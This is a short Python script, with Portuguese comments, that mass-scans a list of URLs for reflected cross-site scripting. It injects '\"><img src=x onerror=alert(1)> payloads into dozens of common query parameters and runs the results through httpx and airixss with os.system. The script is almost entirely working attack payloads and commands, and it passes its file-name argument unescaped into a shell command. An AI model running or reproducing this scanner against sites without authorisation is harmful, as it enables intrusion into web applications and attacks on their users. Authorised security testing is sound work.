
import os
import argparse

# Criação do parser de argumentos
parser = argparse.ArgumentParser(description='Exibe uma lista de URLs.')
parser.add_argument('-l', '--lista', type=str, help='Arquivo contendo a lista de URLs.')

args = parser.parse_args()
urls = args.lista

payload_xss_1 = "?q=%27%22><img src=x onerror=alert(1)>&search=%27%22><img src=x onerror=alert(1)>&query=%27%22><img src=x onerror=alert(1)>&keywords=%27%22><img src=x onerror=alert(1)>&term=%27%22><img src=x onerror=alert(1)>&text=%27%22><img src=x onerror=alert(1)>&input=%27%22><img src=x onerror=alert(1)>&value=%27%22><img src=x onerror=alert(1)>&username=%27%22><img src=x onerror=alert(1)>&password=%27%22><img src=x onerror=alert(1)>&name=%27%22><img src=x onerror=alert(1)>&email=%27%22><img src=x onerror=alert(1)>&comment=%27%22><img src=x onerror=alert(1)>&message=%27%22><img src=x onerror=alert(1)>&body=%27%22><img src=x onerror=alert(1)>&title=%27%22><img src=x onerror=alert(1)>&subject=%27%22><img src=x onerror=alert(1)>&description=%27%22><img src=x onerror=alert(1)>&content=%27%22><img src=x onerror=alert(1)>"
payload_xss_2 = "?id=%27%22><img src=x onerror=alert(1)>&user=%27%22><img src=x onerror=alert(1)>&uid=%27%22><img src=x onerror=alert(1)>&pid=%27%22><img src=x onerror=alert(1)>&eid=%27%22><img src=x onerror=alert(1)>&cid=%27%22><img src=x onerror=alert(1)>&gid=%27%22><img src=x onerror=alert(1)>&aid=%27%22><img src=x onerror=alert(1)>&tid=%27%22><img src=x onerror=alert(1)>&wid=%27%22><img src=x onerror=alert(1)>&lid=%27%22><img src=x onerror=alert(1)>&mid=%27%22><img src=x onerror=alert(1)>&fid=%27%22><img src=x onerror=alert(1)>&did=%27%22><img src=x onerror=alert(1)>&oid=%27%22><img src=x onerror=alert(1)>&vid=%27%22><img src=x onerror=alert(1)>&sid=%27%22><img src=x onerror=alert(1)>&rid=%27%22><img src=x onerror=alert(1)>"
payload_xss_3 = "?redirect=%27%22><img src=x onerror=alert(1)>&return=%27%22><img src=x onerror=alert(1)>&url=%27%22><img src=x onerror=alert(1)>&link=%27%22><img src=x onerror=alert(1)>&next=%27%22><img src=x onerror=alert(1)>&callback=%27%22><img src=x onerror=alert(1)>&referrer=%27%22><img src=x onerror=alert(1)>&referer=%27%22><img src=x onerror=alert(1)>&target=%27%22><img src=x onerror=alert(1)>&destination=%27%22><img src=x onerror=alert(1)>&returnurl=%27%22><img src=x onerror=alert(1)>&return_uri=%27%22><img src=x onerror=alert(1)>&return_path=%27%22><img src=x onerror=alert(1)>&returnto=%27%22><img src=x onerror=alert(1)>&return_to=%27%22><img src=x onerror=alert(1)>"
payload_xss_4 = "?page=%27%22><img src=x onerror=alert(1)>&view=%27%22><img src=x onerror=alert(1)>&section=%27%22><img src=x onerror=alert(1)>&module=%27%22><img src=x onerror=alert(1)>&component=%27%22><img src=x onerror=alert(1)>&task=%27%22><img src=x onerror=alert(1)>&action=%27%22><img src=x onerror=alert(1)>&option=%27%22><img src=x onerror=alert(1)>&format=%27%22><img src=x onerror=alert(1)>&tmpl=%27%22><img src=x onerror=alert(1)>&layout=%27%22><img src=x onerror=alert(1)>&lang=%27%22><img src=x onerror=alert(1)>&language=%27%22><img src=x onerror=alert(1)>&charset=%27%22><img src=x onerror=alert(1)>&stylesheet=%27%22><img src=x onerror=alert(1)>&script=%27%22><img src=x onerror=alert(1)>&js=%27%22><img src=x onerror=alert(1)>"

execucao_xss_1 = "cat "+urls+"|httpx -path '/"+payload_xss_1+"' -mc 200 |airixss -payload '=alert(1)>\"' | grep -Ev 'Not'"
execucao_xss_2 = "cat "+urls+"|httpx -path '/"+payload_xss_2+"' -mc 200 |airixss -payload '=alert(1)>\"' | grep -Ev 'Not'"
execucao_xss_3 = "cat "+urls+"|httpx -path '/"+payload_xss_3+"' -mc 200 |airixss -payload '=alert(1)>\"' | grep -Ev 'Not'"
execucao_xss_4 = "cat "+urls+"|httpx -path '/"+payload_xss_4+"' -mc 200 |airixss -payload '=alert(1)>\"' | grep -Ev 'Not'"

os.system(execucao_xss_1)
os.system(execucao_xss_2)
os.system(execucao_xss_3)
os.system(execucao_xss_4)
